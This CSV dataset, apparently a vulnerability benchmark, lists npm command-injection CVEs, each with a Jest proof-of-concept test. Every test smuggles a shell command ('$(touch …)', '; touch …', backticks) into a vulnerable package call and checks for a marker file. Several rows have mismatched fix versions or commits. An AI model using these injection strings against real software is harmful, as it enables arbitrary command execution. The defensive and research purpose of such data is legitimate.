Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
command-injection,CVE-2021-23381,killing,1.0.6,n/a,command-injection/killing_1.0.6,"test(""Command Injection in killing"", (done) => {
  const killing = require(""killing"");
  const fs = require(""fs"");
  const path = ""./killing"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  killing(""$(touch killing & exit 1)"");
  setTimeout(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  }, 500);
});
",n/a,lib/killing.js:35:7,https://security.snyk.io/vuln/SNYK-JS-KILLING-1078532; https://github.com/advisories/GHSA-cq77-8jpx-892g
command-injection,CVE-2018-16462,apex-publish-static-files,2.0.0,2.0.1,command-injection/apex-publish-static-files_2.0.0,"test(""Command Injection in apex-publish-static-files"", () => {
  expect.assertions(2);
  const publisher = require(""apex-publish-static-files"");
  const fs = require(""fs"");
  const path = ""./apex-publish-static-files"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    publisher.publish({
      connectString: "";touch apex-publish-static-files;"",
      directory: ""./"",
      appID: 111,
    });
  } catch (err) {
  } finally {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  }
});
",https://github.com/vincentmorneau/apex-publish-static-files/commit/2209af8f2b65c24aa55ab757e0e05b958c16f063,index.js:54:25,https://security.snyk.io/vuln/SNYK-JS-APEXPUBLISHSTATICFILES-72552; https://github.com/advisories/GHSA-9jm3-5835-537m
command-injection,CVE-2019-10776,command-exists,1.2.2,0.22.2,command-injection/command-exists_1.2.2,"test(""Command Injection in command-exists"", () => {
  expect.assertions(2);
  const commandExists = require(""command-exists"");
  const fs = require(""fs"");
  const path = ""./command-exists"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  commandExists.sync("";touch command-exists"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/kellyselden/git-diff-apply/commit/106d61d3ae723b4257c2a13e67b95eb40a27e0b5,lib/command-exists.js:78:22,https://security.snyk.io/vuln/npm:command-exists:20180512; https://github.com/advisories/GHSA-84cm-v6jp-gjmr
command-injection,CVE-2019-10776,scp,0.0.3,0.22.2,command-injection/scp_0.0.3,"test(""Command Injection in scp"", (done) => {
  expect.assertions(2);
  const scp = require(""scp"");
  const fs = require(""fs"");
  const path = ""./scp"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let options = {
    file: ""& touch scp; #"",
    user: ""username"",
    host: ""myServer"",
    port: ""20"",
    path: ""~"",
  };
  scp.send(options, function (err) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/kellyselden/git-diff-apply/commit/106d61d3ae723b4257c2a13e67b95eb40a27e0b5,scp.js:21:3,https://security.snyk.io/vuln/SNYK-JS-SCP-1009828; https://github.com/advisories/GHSA-84cm-v6jp-gjmr
command-injection,CVE-2020-28440,corenlp-js-interface,1.0.3,n/a,command-injection/corenlp-js-interface_1.0.3,"test(""Command Injection in corenlp-js-interface"", () => {
  expect.assertions(2);
  const a = require(""corenlp-js-interface"");
  const fs = require(""fs"");
  const path = ""./corenlp-js-interface"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a(""') touch corenlp-js-interface # '"", """", """", """");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",n/a,index.js:5:20,https://security.snyk.io/vuln/SNYK-JS-CORENLPJSINTERFACE-1050435; https://github.com/advisories/GHSA-ffxg-xm4w-3wg9
command-injection,CVE-2017-16034,pidusage,1.0.0,1.1.5,command-injection/pidusage_1.0.0,"test(""Command Injection in pidusage"", (done) => {
  expect.assertions(1);
  const os = require(""os"");
  os.platform = () => {
    return ""freebsd"";
  };
  const roar_pidusage = require(""pidusage"");
  const fs = require(""fs"");
  const path = ""./pidusage"";
  roar_pidusage.stat(""$(touch pidusage)"", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/soyuka/pidusage/commit/b70eca15f7ca7f1b82a15f8a5d4bb48737f5a89d,lib/stats.js:108:5,https://security.snyk.io/vuln/npm:pidusage:20170605; https://github.com//advisories/GHSA-hfq9-rfpv-j8r8
command-injection,CVE-2020-28447,xopen,1.0.0,n/a,command-injection/xopen_1.0.0,"test(""Command Injection in xopen"", () => {
  expect.assertions(2);
  const root = require(""xopen"");
  const fs = require(""fs"");
  const path = ""./xopen"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_code = ""& touch xopen"";
  return root(attack_code).finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",n/a,index.js:13:5,https://security.snyk.io/vuln/SNYK-JS-XOPEN-1050981; 
command-injection,CVE-2020-28435,ffmpeg-sdk,0.0.5,n/a,command-injection/ffmpeg-sdk_0.0.5,"test(""Command Injection in ffmpeg-sdk"", () => {
  expect.assertions(2);
  const root = require(""ffmpeg-sdk"");
  const fs = require(""fs"");
  const path = ""./ffmpeg-sdk"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return root
    .execute(""touch ffmpeg-sdk"")
    .then(() => {})
    .catch((err) => {})
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",n/a,index.js:9:5,https://security.snyk.io/vuln/SNYK-JS-FFMPEGSDK-1050429; 
command-injection,CVE-2020-7636,adb-driver,0.1.8,n/a,command-injection/adb-driver_0.1.8,"test(""Command Injection in adb-driver"", () => {
  expect.assertions(2);
  const root = require(""adb-driver"");
  const fs = require(""fs"");
  const path = ""./adb-driver"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return root.execADBCommand("" & touch adb-driver"").finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",n/a,build/AdbDriver.js:26:25,https://security.snyk.io/vuln/SNYK-JS-ADBDRIVER-564430; https://github.com/advisories/GHSA-4m6q-rxhm-675w
command-injection,CVE-2021-23363,kill-by-port,0.0.1,0.0.2,command-injection/kill-by-port_0.0.1,"test(""Command Injection in kill-by-port"", () => {
  expect.assertions(2);
  const kill_by_port = require(""kill-by-port"");
  const fs = require(""fs"");
  const path = ""./kill-by-port"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  kill_by_port.killByPort(""$(touch kill-by-port)"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, () => {});
});
",https://github.com/GuyMograbi/kill-by-port/commit/ea5b1f377e196a4492e05ff070eba8b30b7372c4,index.js:8:17,https://security.snyk.io/vuln/SNYK-JS-KILLBYPORT-1078531; https://github.com/advisories/GHSA-mm4f-47ch-f7hx
command-injection,CVE-2020-15123,codecov,3.6.4,3.7.1,command-injection/codecov_3.6.4,"process.on(""unhandledRejection"", () => {});
test(""Command Injection in codecov"", async () => {
  expect.assertions(2);
  const root = require(""codecov"");
  const fs = require(""fs"");
  const path = ""./codecov"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let args = {
    options: {
      ""gcov-root"": ""& touch codecov &"",
      ""gcov-exec"": "" "",
      ""gcov-args"": "" "",
    },
  };
  try {
    await root.handleInput.upload(
      args,
      function () {
        console.log(""success"");
      },
      function () {
        console.log(""Fail!"");
      }
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/codecov/codecov-node/commit/c0711c656686e902af2cd92d6aecc8074de4d83d,lib/codecov.js:419:7,https://security.snyk.io/vuln/SNYK-JS-CODECOV-585979; https://github.com/advisories/GHSA-xp63-6vf5-xf3v
command-injection,CVE-2020-7794,buns,1.1.6,n/a,command-injection/buns_1.1.6,"test(""Command Injection in buns"", () => {
  expect.assertions(2);
  var root = require(""buns"");
  const fs = require(""fs"");
  const path = ""./buns"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var name = ""& touch buns"";
  try {
    root.install(name);
  } catch (error) {
  } finally {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  }
});
",n/a,lib/index.js:678:9,https://security.snyk.io/vuln/SNYK-JS-BUNS-1050389; https://github.com/advisories/GHSA-487w-pqcm-63hq
command-injection,CVE-2021-23359,port-killer,1.0.1,n/a,command-injection/port-killer_1.0.1,"test(""Command Injection in port-killer"", () => {
  expect.assertions(2);
  const port_killer = require(""port-killer"");
  const fs = require(""fs"");
  const path = ""./port-killer"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  port_killer(""$(touch port-killer)"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",n/a,index.js:19:9,https://security.snyk.io/vuln/SNYK-JS-PORTKILLER-1078533; https://github.com/advisories/GHSA-2548-q746-x5x6
command-injection,CVE-2020-28431,wc-cmd,1.0.9,n/a,command-injection/wc-cmd_1.0.9,"test(""Command Injection in wc-cmd"", (done) => {
  expect.assertions(2);
  const a = require(""wc-cmd"");
  const fs = require(""fs"");
  const path = ""./wc-cmd"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a(""touch wc-cmd"", () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",n/a,index.js:49:19,https://security.snyk.io/vuln/SNYK-JS-WCCMD-1050423; https://github.com/advisories/GHSA-mx3r-w3pj-7wv7
command-injection,CVE-2015-7982,gm,1.20.0,=1.20.0,command-injection/gm_1.20.0,"const { doesNotMatch } = require(""assert"");
test(""Command Injection in gm"", (done) => {
  expect.assertions(2);
  const gm = require(""gm"");
  const fs = require(""fs"");
  const path = ""./gm"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  gm.compare(""$(touch gm)"", ""/path/to/another.png"", function (
    err,
    isEqual,
    equality,
    raw,
    path1,
    path2
  ) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",n/a,lib/compare.js:72:5,https://security.snyk.io/vuln/npm:gm:20151026; https://github.com/advisories/GHSA-pjh3-jv7w-9jpr
command-injection,CVE-2021-23355,ps-kill,1.0.0,n/a,command-injection/ps-kill_1.0.0,"test(""Command Injection in ps-kill"", (done) => {
  expect.assertions(3);
  expect.assertions(2);
  const ps_kill = require(""ps-kill"");
  const fs = require(""fs"");
  const path = ""./ps-kill"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  ps_kill.kill(""$(touch ps-kill)"", function (error) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",n/a,index.js:8:3,https://security.snyk.io/vuln/SNYK-JS-PSKILL-1078529; https://github.com/advisories/GHSA-7qmm-q394-fmch
command-injection,CVE-2020-26707,aaptjs,1.3.1,n/a,command-injection/aaptjs_1.3.1,"test(""Remote code execution in aaptjs"", (done) => {
  const aaptjs = require(""aaptjs"");
  const fs = require(""fs"");
  const path = ""./aaptjs"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    aaptjs.list(""; touch aaptjs"", (err, data) => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {
        done();
      });
    });
  } catch (error) {}
});
",n/a,index.js:18:3,https://security.snyk.io/vuln/SNYK-JS-AAPTJS-1769273; https://github.com/advisories/GHSA-m7p2-ghfh-pjvx
command-injection,CVE-2020-28439,corenlp-js-prefab,1.0.1,n/a,command-injection/corenlp-js-prefab_1.0.1,"test(""Command Injection in corenlp-js-prefab"", (done) => {
  expect.assertions(2);
  const a = require(""corenlp-js-prefab"");
  const fs = require(""fs"");
  const path = ""./corenlp-js-prefab"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    a.process(""') touch corenlp-js-prefab # '"");
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {
    done();
  });
});
",n/a,index.js:10:16,https://security.snyk.io/vuln/SNYK-JS-CORENLPJSPREFAB-1050434; https://github.com/advisories/GHSA-h73g-8g27-xxcx
command-injection,CVE-2020-28436,google-cloudstorage-commands,0.0.1,n/a,command-injection/google-cloudstorage-commands_0.0.1,"test(""Command Injection in google-cloudstorage-commands"", () => {
  expect.assertions(2);
  var root = require(""google-cloudstorage-commands"");
  const fs = require(""fs"");
  const path = ""./google-cloudstorage-commands"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return root
    .upload(""./"", ""& touch google-cloudstorage-commands"", true)
    .finally(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
",n/a,index.js:11:24,https://security.snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431; 
command-injection,CVE-2019-10783,lsof,0.1.0,n/a,command-injection/lsof_0.1.0,"const { doesNotMatch } = require(""assert"");
test(""Command Injection in lsof"", (done) => {
  expect.assertions(2);
  const root = require(""lsof"");
  const fs = require(""fs"");
  const path = ""./lsof"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_code = ""& touch lsof &"";
  root.rawTcpPort(attack_code, function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",n/a,lib/lsof.js:37:8,https://security.snyk.io/vuln/SNYK-JS-LSOF-543632; https://github.com/advisories/GHSA-whq6-mj2r-mjqc
command-injection,CVE-2018-13797,macaddress,0.2.8,0.2.9,command-injection/macaddress_0.2.8,"test(""Command Injection in macaddress"", (done) => {
  expect.assertions(2);
  const fs = require(""fs"");
  const path = ""./macaddress"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let iface = ""; touch macaddress; echo "";
  require(""macaddress"").one(iface, function (err, mac) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/scravy/node-macaddress/commit/358fd594adb196a86b94ac9c691f69fe5dad2332,lib/unix.js:4:5,https://security.snyk.io/vuln/npm:macaddress:20180511; https://github.com/advisories/GHSA-pp57-mqmh-44h7
command-injection,CVE-2020-7624,effect,1.0.4,n/a,command-injection/effect_1.0.4,"test(""Command Injection in effect"", (done) => {
  expect.assertions(2);
  const Root = require(""effect"");
  const fs = require(""fs"");
  const path = ""./effect"";
  var options = { image: ""& touch effect"" };
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  Root.edge(options, () => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    try {
      fs.unlinkSync(""-colorspace"");
      fs.unlinkSync(""-edge"");
      fs.unlinkSync(""-negate"");
      fs.unlinkSync(""-resize"");
      fs.unlinkSync(""5"");
      fs.unlinkSync(""100%"");
      fs.unlinkSync(""Gray"");
      fs.unlinkSync(path);
    } catch (err) {}
    done();
  });
});
",n/a,helper.js:24:5,https://security.snyk.io/vuln/SNYK-JS-EFFECT-564256; 
command-injection,CVE-2019-15597,node-df,0.1.4,n/a,command-injection/node-df_0.1.4,"test(""Command Injection in node-df"", (done) => {
  expect.assertions(2);
  const df = require(""node-df"");
  const fs = require(""fs"");
  const path = ""./node-df"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let options = {
    file: ""/;touch node-df"",
    prefixMultiplier: ""GB"",
    isDisplayPrefixMultiplier: true,
    precision: 2,
  };
  df(options, function (error, response) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",n/a,lib/index.js:41:5,https://security.snyk.io/vuln/SNYK-JS-NODEDF-536779; https://github.com/advisories/GHSA-wp7m-mrvf-599c
command-injection,,extra-asciinema,1.0.0,1.0.23,command-injection/extra-asciinema_1.0.0,"test(""Command Injection in extra-asciinema"", (done) => {
  expect.assertions(2);
  const asciinema = require(""extra-asciinema"");
  const fs = require(""fs"");
  const path = ""./extra-asciinema"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  asciinema.uploadSync(""; touch extra-asciinema"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {
    done();
  });
});
",https://github.com/nodef/extra-asciinema/commit/fd1a8a38d6c72e1eb573b2ab03d5e86de8047480,index.js:208:20,https://security.snyk.io/vuln/SNYK-JS-EXTRAASCIINEMA-608292; 
command-injection,CVE-2020-8178,install-package,0.4.17,n/a,command-injection/jison_0.4.17,"test(""Command Injection in jison"", (done) => {
  expect.assertions(2);
  exec = require(""child_process"").exec;
  const fs = require(""fs"");
  const path = ""./jison"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let command = ""; touch jison"";
  exec(""jison "" + command, function (error) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",n/a,build/queueRunner.js:45:12,https://security.snyk.io/vuln/SNYK-JS-JISON-570539; https://github.com/advisories/GHSA-vr9x-mm65-2438
command-injection,CVE-2021-23377,lycwed-spritesheetjs,1.2.5,n/a,command-injection/lycwed-spritesheetjs_1.2.5,"test(""Command Injection in lycwed-spritesheetjs"", (done) => {
  expect.assertions(2);
  let spritesheet = require(""lycwed-spritesheetjs"");
  const fs = require(""fs"");
  const path = ""./lycwed-spritesheetjs"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  spritesheet(
    ""./"",
    {
      fuzz: ""& touch lycwed-spritesheetjs #"",
      ext: ""json"",
    },
    function () {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {
        done();
      });
    }
  );
});
",n/a,lib/generator.js:85:7,https://security.snyk.io/vuln/SNYK-JS-LYCWEDSPRITESHEETJS-1050428; https://github.com/advisories/GHSA-rhwp-9vm9-547q
command-injection,CVE-2018-16460,ps,0.0.2,1.0.0,command-injection/ps_0.0.2,"test(""Command Injection in ps"", (done) => {
  expect.assertions(2);
  const ps = require(""ps"");
  const fs = require(""fs"");
  const path = ""./ps"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  ps.lookup({ pid: ""$(touch ps)"" }, function (err, proc) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",n/a,lib/index.js:8:5,https://security.snyk.io/vuln/SNYK-JS-PS-72307; https://github.com/advisories/GHSA-cfhg-9x44-78h2
command-injection,CVE-2020-7795,get-npm-package-version,1.0.6,1.0.7,command-injection/get-npm-package-version_1.0.6,"test(""Command Injection in get-npm-package-version"", () => {
  expect.assertions(2);
  const a = require(""get-npm-package-version"");
  const fs = require(""fs"");
  const path = ""./get-npm-package-version"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a(""& touch get-npm-package-version"");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/hoperyy/get-npm-package-version/commit/40b1cf31a0607ea66f9e30a0c3af1383b52b2dec,index.js:16:48,https://security.snyk.io/vuln/SNYK-JS-GETNPMPACKAGEVERSION-1050390; 
command-injection,CVE-2019-15597,xps,1.0.2,n/a,command-injection/xps_1.0.2,"test(""Command Injection in xps"", (done) => {
  expect.assertions(2);
  const ps = require(""xps"");
  const fs = require(""fs"");
  const path = ""./xps"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  ps.kill(""`touch xps;`"").fork(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
",https://github.com/sorellabs/xps/commit/768481146b8ead3811310eecc0f56e2d107cb740,lib/utils.js:28:5,https://security.snyk.io/vuln/SNYK-JS-XPS-590098; https://github.com/advisories/GHSA-wp7m-mrvf-599c
command-injection,CVE-2018-3757,pdf-image,1.0.5,2.0.1,command-injection/pdf-image_1.0.5,"test(""Command Injection in pdf-image"", () => {
  expect.assertions(2);
  const PDFImage = require(""pdf-image"").PDFImage;
  const fs = require(""fs"");
  const path = ""./pdf-image"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let pdfImage = new PDFImage('asd.pdf""; touch pdf-image""');
  try {
    return pdfImage.numberOfPages().then(function (imagePath) {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
  } catch (e) {}
});
",https://github.com/roest01/node-pdf-image/commit/54679496a89738443917608c2bbe2f6e5dd20e83,index.js:43:7,https://security.snyk.io/vuln/npm:pdf-image:20180529; https://github.com/advisories/GHSA-5gwh-g79j-vh4q
command-injection,CVE-2020-7730,bestzip,2.1.6,2.1.7,command-injection/bestzip_2.1.6,"test(""Command Injection in bestzip"", (done) => {
  expect.assertions(2);
  const zip = require(""bestzip"");
  const fs = require(""fs"");
  const path = ""./bestzip"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  zip({
    source: """",
    destination: ""./; touch bestzip"",
  }).finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
    done();
  });
});
",https://github.com/nfriedly/node-bestzip/commit/45d4a901478c6a8f396c8b959dd6cf8fd3f955b6,lib/bestzip.js:27:27,https://security.snyk.io/vuln/SNYK-JS-BESTZIP-609371; https://github.com/advisories/GHSA-6xv6-jpvw-cx6q
command-injection,,git-lib,1.6.0,n/a,command-injection/git-lib_1.6.0,"test(""Remote code execution in git-lib"", () => {
  expect.assertions(2);
  const git = require(""git-lib"");
  const fs = require(""fs"");
  const path = ""./git-lib"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    return git.add(""test;touch git-lib;"").finally(function () {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
  } catch (error) {}
});
",n/a,git.js:13:9,https://security.snyk.io/vuln/SNYK-JS-GITLIB-1012734; 
command-injection,CVE-2021-23377,onion-oled-js,0.0.2,n/a,command-injection/onion-oled-js_0.0.2,"test(""Command Injection in onion-oled-js"", () => {
  expect.assertions(2);
  const OLEDExp = require(""onion-oled-js"").OLEDExp;
  const fs = require(""fs"");
  const path = ""./onion-oled-js"";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log(""File removed:"", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return OLEDExp.scroll("";touch onion-oled-js #"").finally(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
",n/a,src/oled-exp.js:91:16,https://security.snyk.io/vuln/SNYK-JS-ONIONOLEDJS-1078808; https://github.com/advisories/GHSA-rhwp-9vm9-547q
